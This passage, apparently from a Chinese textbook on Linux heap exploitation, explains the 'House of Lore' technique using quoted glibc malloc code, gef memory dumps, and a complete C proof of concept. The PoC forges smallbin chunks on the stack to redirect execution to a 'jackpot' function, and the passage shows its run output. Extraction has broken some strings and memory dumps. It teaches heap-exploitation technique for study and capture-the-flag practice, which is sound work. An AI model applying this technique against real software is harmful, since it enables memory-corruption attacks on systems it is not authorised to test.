if (!prev_inuse(p)) {
prevsize = p->prev_size;
size += prevsize;
p = chunk_at_offset(p, -((long) prevsize));
unlink(av, p, bck, fwd);
}
if (nextchunk != av->top) {
/*
Place the chunk in unsorted chunk list. Chunks are
not placed into regular bins until after they have
been given one chance to be used in malloc.
*/
[...]
}
/*
If the chunk borders the current high end of memory,
consolidate into top
*/
else {
size += nextsize;
set_head(p, size | PREV_INUSE);
av->top = p;
check_chunk(av, p);
}
接下来，申请一块大空间，大到可以把 chunk b2 包含进来，这样 chunk b2 就完全
被我们控制了。
485
3.1.7 Linux 堆利用（二）
gef➤ x/42gx a-0x10
0x603000: 0x0000000000000000 0x0000000000000021 
#include 
#include 
#include 
487
3.1.7 Linux 堆利用（二）
void jackpot(){ puts("Nice jump d00d"); exit(0); }
int main() {
intptr_t *victim = malloc(0x80);
memset(victim, 'A', 0x80);
void *p5 = malloc(0x10);
memset(p5, 'A', 0x10);
intptr_t *victim_chunk = victim - 2;
fprintf(stderr, "Allocated the victim (small) chunk: %p\n",
victim);
intptr_t* stack_buffer_1[4] = {0};
intptr_t* stack_buffer_2[3] = {0};
stack_buffer_1[0] = 0;
stack_buffer_1[2] = victim_chunk;
stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
fprintf(stderr, "stack_buffer_1: %p\n", (void*)stack_buffer_
1);
fprintf(stderr, "stack_buffer_2: %p\n\n", (void*)stack_buffe
r_2);
free((void*)victim);
fprintf(stderr, "Freeing the victim chunk %p, it will be ins
erted in the unsorted bin\n", victim);
fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
void *p2 = malloc(0x100);
fprintf(stderr, "Malloc a chunk that can't be handled by the
unsorted bin, nor the SmallBin: %p\n", p2);
fprintf(stderr, "The victim chunk %p will be inserted in fro
nt of the SmallBin\n", victim);
fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
victim[1] = (intptr_t)stack_buffer_1;
fprintf(stderr, "Now emulating a vulnerability that can over
write the victim->bk pointer\n");
488
3.1.7 Linux 堆利用（二）
void *p3 = malloc(0x40);
char *p4 = malloc(0x80);
memset(p4, 'A', 0x10);
fprintf(stderr, "This last malloc should return a chunk at t
he position injected in bin->bk: %p\n", p4);
fprintf(stderr, "The fd pointer of stack_buffer_2 has change
d: %p\n\n", stack_buffer_2[2]);
intptr_t sc = (intptr_t)jackpot;
memcpy((p4+40), &sc, 8);
}
$ gcc -g house_of_lore.c
$ ./a.out
Allocated the victim (small) chunk: 0x1b2e010
stack_buffer_1: 0x7ffe5c570350
stack_buffer_2: 0x7ffe5c570330
Freeing the victim chunk 0x1b2e010, it will be inserted in the u
nsorted bin
victim->fd: 0x7f239d4c9b78
victim->bk: 0x7f239d4c9b78
Malloc a chunk that can't be handled by the unsorted bin, nor th
e SmallBin: 0x1b2e0c0
The victim chunk 0x1b2e010 will be inserted in front of the Smal
lBin
victim->fd: 0x7f239d4c9bf8
victim->bk: 0x7f239d4c9bf8
Now emulating a vulnerability that can overwrite the victim->bk
pointer
This last malloc should return a chunk at the position injected
in bin->bk: 0x7ffe5c570360
The fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8
Nice jump d00d
489
3.1.7 Linux 堆利用（二）
在前面的技术中，我们已经知道怎样去伪造一个 fake chunk，接下来，我们要尝试
伪造一条 small bins 链。
首先创建两个 chunk，第一个是我们的 victim chunk，请确保它是一个 small
chunk，第二个随意，只是为了确保在 free 时 victim chunk 不会被合并进 top
chunk 里。然后，在栈上伪造两个 fake chunk，让 fake chunk 1 的 fd 指向 victim
chunk，bk 指向 fake chunk 2；fake chunk 2 的 fd 指向 fake chunk 1，这样一个
small bin 链就差不多了：
gef➤ x/26gx victim-2
0x603000: 0x0000000000000000 0x0000000000000091 fake chunk 1
0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 victim chunk, bk->fake chunk 2
0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00
molloc 中对于 small bin 链表的检查是这样的：
490
3.1.7 Linux 堆利用（二）
[...]
else
{
bck = victim->bk;
if (__glibc_unlikely (bck->fd != victim))
{
errstr = "malloc(): smallbin double linked lis
t corrupted";
goto errout;
}
set_inuse_bit_at_offset (victim, nb);
bin->bk = bck;
bck->fd = bin;
[...]
即检查 bin 中第二块的 bk 指针是否指向第一块，来发现对 small bins 的破坏。为
了绕过这个检查，所以才需要同时伪造 bin 中的前 2 个 chunk。
接下来释放掉 victim chunk，它会被放到 unsoted bin 中，且 fd/bk 均指向 unsorted
bin 的头部：
491
3.1.7 Linux 堆利用（二）
gef➤ x/26gx victim-2
0x603000: 0x0000000000000000 0x0000000000000091 fake chunk 1
0x603020: 0x4141414141414141 0x4141414141414141
0x603030: 0x4141414141414141 0x4141414141414141
0x603040: 0x4141414141414141 0x4141414141414141
0x603050: 0x4141414141414141 0x4141414141414141
0x603060: 0x4141414141414141 0x4141414141414141
0x603070: 0x4141414141414141 0x4141414141414141
0x603080: 0x4141414141414141 0x4141414141414141
0x603090: 0x0000000000000090 0x0000000000000020 fake chunk 1
0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 victim chunk, bk->fake chunk 2
0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00
我们知道 small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾
部。这时整条链是这样的：
HEAD(undefined)  fake chunk 2  fake chunk 1  victim chu
nk  TAIL